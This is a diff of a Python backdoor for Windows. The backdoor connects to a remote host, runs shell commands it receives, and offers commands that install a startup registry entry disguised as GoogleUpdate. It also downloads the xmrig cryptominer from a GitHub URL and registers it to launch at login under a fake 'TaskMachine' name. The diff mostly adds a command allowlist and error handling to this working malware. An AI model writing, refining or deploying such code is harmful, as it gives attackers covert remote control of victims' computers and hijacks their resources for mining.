@@ -3,6 +3,7 @@ import socket,subprocess,os,getpass,urllib.request
 #Globals
 IP = "127.0.0.1"
 PORT = 8888
+DATA = 16384
 user = getpass.getuser()
 CopiedPath = (f"C:/Users/{user}/AppData/Roaming/GoogleUpdate/GoogleUpdateHV.py")
 CopiedPath2 = (f"C:/Users/{user}/AppData/Roaming/TaskMachine/TaskMachineQC.exe")
@@ -17,6 +18,7 @@ def persist():
     urllib.request.urlretrieve(url, filename)
     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + filename, shell=True)
 
+
 def mine():
     os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine'))
     url = "https://github.com/srpentesters/ggg3s/blob/main/xmrig.exe?raw=true"
@@ -27,13 +29,11 @@ def mine():
     urllib.request.urlretrieve(url2, filename2m)
     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskmachineQC /t REG_SZ /d ' + filenamem, shell=True)
 
-def backup_file(filename, file_data):
-    filename_parts = filename.split(".")
-    backup_filename = filename_parts[0] + "_backup." + filename_parts[1]
-    with open(backup_filename, "w", encoding='utf-8') as f:
-        f.write(file_data)
-
 def parse_commands(data):
+    available_commands = ['cd','persist','mine','dir','cd','exit']
+    command = data[:].decode("utf-8").split()[0]
+    if command not in available_commands:
+        return("Command not recognized") + "\n"
     if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8"))>0:
         try:
             os.chdir(data[3:].decode("utf-8"))
@@ -43,26 +43,19 @@ def parse_commands(data):
     elif data[:7].decode("utf-8") == "persist":
         persist()
         return "Persistent File Added In: " + CopiedPath + "\n"
-    elif data[:7].decode("utf-8") == "mine":
+    elif data[:4].decode("utf-8") == "mine":
         mine()
         return "Miner Added To Startup In: " + CopiedPath2 + "\n"
-    elif data[:4].decode("utf-8") == "show":
-        try:
-            filename = data[5:].decode("utf-8").strip()
-            with open(filename, "rb") as f:
-                file_data = f.read()
-                file_data = file_data.decode("utf-8", "ignore")
-                backup_file(filename, file_data)
-            return "File Created: " + filename + "_backup" + "\n"
-        except Exception as e:
-            return "Error reading file: " + str(e) + "\n"
-    else:
+    try:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte,"utf-8")
         return output_str
+    except Exception as e:
+        return "Error running command: " + str(e) + "\n"
+
 while True:
-    data = s.recv(4096)
+    data = s.recv(DATA)
     if not data:
         s.send(str.encode("No data received"))
         break
@@ -70,5 +63,3 @@ while True:
         result = parse_commands(data)
         s.send(str.encode(result))
 s.close()
-
-
